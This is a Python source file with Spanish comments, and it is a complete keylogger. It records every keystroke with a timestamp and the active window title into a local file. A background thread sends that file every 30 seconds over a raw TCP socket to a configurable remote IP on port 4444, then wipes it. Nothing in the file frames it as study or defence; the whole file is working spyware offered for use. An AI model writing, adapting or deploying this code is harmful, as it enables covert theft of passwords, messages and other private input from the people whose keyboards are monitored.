from pynput import keyboard
import socket
import threading
import datetime
import os
import time

SERVER_IP = 'TU_IP_AQUÍ'  # <- aquí va la IP de tu PC
SERVER_PORT = 4444
SEND_INTERVAL = 30  # segundos
LOG_FILE = "keylog.txt"

log = []

def send_log():
    while True:
        time.sleep(SEND_INTERVAL)
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((SERVER_IP, SERVER_PORT))
                    with open(LOG_FILE, "rb") as f:
                        data = f.read()
                        s.sendall(data)
                    open(LOG_FILE, "w").close()  # limpia el log después de enviar
            except Exception as e:
                print("Error enviando log:", e)

def on_press(key):
    try:
        ventana = os.popen('xdotool getactivewindow getwindowname').read().strip()
    except:
        ventana = "unknown"
    
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        log_entry = f"[{now}][{ventana}] {key.char}\n"
    except AttributeError:
        log_entry = f"[{now}][{ventana}] {key}\n"
    
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

# Iniciar thread de envío
threading.Thread(target=send_log, daemon=True).start()

# Listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
